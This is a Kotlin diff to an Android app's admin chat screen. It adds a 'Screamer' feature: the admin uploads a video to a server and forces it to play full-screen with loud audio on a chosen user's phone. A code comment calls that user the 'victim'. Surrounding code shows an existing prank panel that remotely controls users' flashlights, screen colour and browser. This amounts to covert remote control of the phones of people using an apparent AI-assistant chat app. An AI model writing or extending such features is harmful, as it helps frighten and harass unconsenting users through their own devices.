@@ -1,5 +1,9 @@
 package com.example.ui.screens
 
+import android.net.Uri
+import android.widget.Toast
+import androidx.activity.compose.rememberLauncherForActivityResult
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.animation.AnimatedVisibility
 import androidx.compose.animation.expandVertically
 import androidx.compose.animation.fadeIn
@@ -41,12 +45,14 @@ import androidx.compose.material.icons.filled.InvertColors
 import androidx.compose.material.icons.filled.Language
 import androidx.compose.material.icons.filled.Person
 import androidx.compose.material.icons.filled.Sensors
+import androidx.compose.material.icons.filled.SmartDisplay
 import androidx.compose.material.icons.filled.Warning
 import androidx.compose.material.icons.outlined.Celebration
 import androidx.compose.material.icons.outlined.FlashlightOff
 import androidx.compose.material.icons.outlined.Visibility
 import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.ButtonDefaults
+import androidx.compose.material3.CircularProgressIndicator
 import androidx.compose.material3.ElevatedButton
 import androidx.compose.material3.ExperimentalMaterial3Api
 import androidx.compose.material3.FilledIconButton
@@ -77,6 +83,7 @@ import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.platform.testTag
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.input.ImeAction
@@ -98,11 +105,13 @@ fun AdminChatDetailScreen(
     onBackClick: () -> Unit,
     modifier: Modifier = Modifier
 ) {
+    val context = LocalContext.current
     val messages by adminViewModel.selectedUserMessages.collectAsStateWithLifecycle()
     val replyText by adminViewModel.replyInputText.collectAsStateWithLifecycle()
     val allUsers by adminViewModel.allUsers.collectAsStateWithLifecycle()
     val flashlightStates by adminViewModel.userFlashlightStates.collectAsStateWithLifecycle()
     val bloodRedStates by adminViewModel.userBloodRedStates.collectAsStateWithLifecycle()
+    val isUploadingScreamer by adminViewModel.isUploadingScreamer.collectAsStateWithLifecycle()
 
     val currentUser = allUsers.find { it.id == userId }
     val userRole = currentUser?.selectedAiRole ?: "Nova Assistant"
@@ -110,6 +119,18 @@ fun AdminChatDetailScreen(
     var showPrankPanel by remember { mutableStateOf(false) }
     var showBrowserDialog by remember { mutableStateOf(false) }
     var browserQueryInput by remember { mutableStateOf("") }
+
+    var selectedVideoUri by remember { mutableStateOf<Uri?>(null) }
+    var showScreamerConfirmDialog by remember { mutableStateOf(false) }
+
+    val videoPickerLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.GetContent()
+    ) { uri: Uri? ->
+        if (uri != null) {
+            selectedVideoUri = uri
+            showScreamerConfirmDialog = true
+        }
+    }
 
     val isFlashlightOn = flashlightStates[userId] ?: false
     val isBloodRedOn = bloodRedStates[userId] ?: false
@@ -375,6 +396,46 @@ fun AdminChatDetailScreen(
                                         Spacer(modifier = Modifier.width(4.dp))
                                         Text("Open Chrome", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                     }
+
+                                    // 6. Screamer (Pick video from gallery and play fullscreen on victim)
+                                    ElevatedButton(
+                                        onClick = {
+                                            videoPickerLauncher.launch("video/*")
+                                        },
+                                        enabled = !isUploadingScreamer,
+                                        colors = ButtonDefaults.elevatedButtonColors(
+                                            containerColor = MaterialTheme.colorScheme.errorContainer.copy(alpha = 0.8f)
+                                        ),
+                                        modifier = Modifier
+                                            .weight(1f)
+                                            .testTag("prank_screamer_btn"),
+                                        shape = RoundedCornerShape(12.dp),
+                                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 6.dp)
+                                    ) {
+                                        if (isUploadingScreamer) {
+                                            CircularProgressIndicator(
+                                                modifier = Modifier.size(14.dp),
+                                                strokeWidth = 2.dp,
+                                                color = MaterialTheme.colorScheme.error
+                                            )
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Text("Sending...", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                                        } else {
+                                            Icon(
+                                                imageVector = Icons.Default.SmartDisplay,
+                                                contentDescription = "Screamer Video",
+                                                tint = MaterialTheme.colorScheme.error,
+                                                modifier = Modifier.size(16.dp)
+                                            )
+                                            Spacer(modifier = Modifier.width(4.dp))
+                                            Text(
+                                                "Screamer",
+                                                fontSize = 11.sp,
+                                                fontWeight = FontWeight.Bold,
+                                                color = MaterialTheme.colorScheme.error
+                                            )
+                                        }
+                                    }
                                 }
                             }
                         }
@@ -629,6 +690,93 @@ fun AdminChatDetailScreen(
             dismissButton = {
                 TextButton(
                     onClick = { showBrowserDialog = false }
+                ) {
+                    Text("Cancel")
+                }
+            }
+        )
+    }
+
+    if (showScreamerConfirmDialog && selectedVideoUri != null) {
+        AlertDialog(
+            onDismissRequest = {
+                if (!isUploadingScreamer) {
+                    showScreamerConfirmDialog = false
+                    selectedVideoUri = null
+                }
+            },
+            icon = {
+                Icon(
+                    imageVector = Icons.Default.SmartDisplay,
+                    contentDescription = "Screamer Prank",
+                    tint = MaterialTheme.colorScheme.error,
+                    modifier = Modifier.size(32.dp)
+                )
+            },
+            title = {
+                Text("Send Screamer Video?")
+            },
+            text = {
+                Column(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    Text(
+                        text = "This will upload your selected video from gallery to the Colab server and immediately trigger a full-screen screamer with loud audio on User #${userId.takeLast(4)}'s phone.",
+                        style = MaterialTheme.typography.bodyMedium
+                    )
+                    if (isUploadingScreamer) {
+                        Spacer(modifier = Modifier.height(8.dp))
+                        Row(
+                            verticalAlignment = Alignment.CenterVertically,
+                            horizontalArrangement = Arrangement.spacedBy(12.dp)
+                        ) {
+                            CircularProgressIndicator(
+                                modifier = Modifier.size(24.dp),
+                                strokeWidth = 2.dp,
+                                color = MaterialTheme.colorScheme.error
+                            )
+                            Text(
+                                text = "Uploading video to Colab server...",
+                                style = MaterialTheme.typography.bodySmall,
+                                color = MaterialTheme.colorScheme.error,
+                                fontWeight = FontWeight.SemiBold
+                            )
+                        }
+                    }
+                }
+            },
+            confirmButton = {
+                FilledTonalButton(
+                    onClick = {
+                        val uri = selectedVideoUri ?: return@FilledTonalButton
+                        adminViewModel.sendScreamerVideo(userId, uri) { success, err ->
+                            showScreamerConfirmDialog = false
+                            selectedVideoUri = null
+                            if (success) {
+                                Toast.makeText(context, "Screamer video sent to user!", Toast.LENGTH_SHORT).show()
+                            } else {
+                                Toast.makeText(context, err ?: "Upload failed", Toast.LENGTH_LONG).show()
+                            }
+                        }
+                    },
+                    enabled = !isUploadingScreamer,
+                    colors = ButtonDefaults.filledTonalButtonColors(
+                        containerColor = MaterialTheme.colorScheme.error,
+                        contentColor = MaterialTheme.colorScheme.onError
+                    ),
+                    modifier = Modifier.testTag("confirm_send_screamer_btn")
+                ) {
+                    Text(if (isUploadingScreamer) "Uploading..." else "Send Screamer")
+                }
+            },
+            dismissButton = {
+                TextButton(
+                    onClick = {
+                        showScreamerConfirmDialog = false
+                        selectedVideoUri = null
+                    },
+                    enabled = !isUploadingScreamer
                 ) {
                     Text("Cancel")
                 }
